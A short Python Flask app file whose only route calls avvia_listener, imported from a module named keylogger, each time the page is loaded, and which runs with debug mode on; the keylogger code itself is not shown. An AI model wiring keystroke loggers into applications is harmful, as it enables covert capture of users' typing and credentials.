from flask import *
from keylogger import avvia_listener

app = Flask(__name__)

@app.route('/')
def main():
    avvia_listener()
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)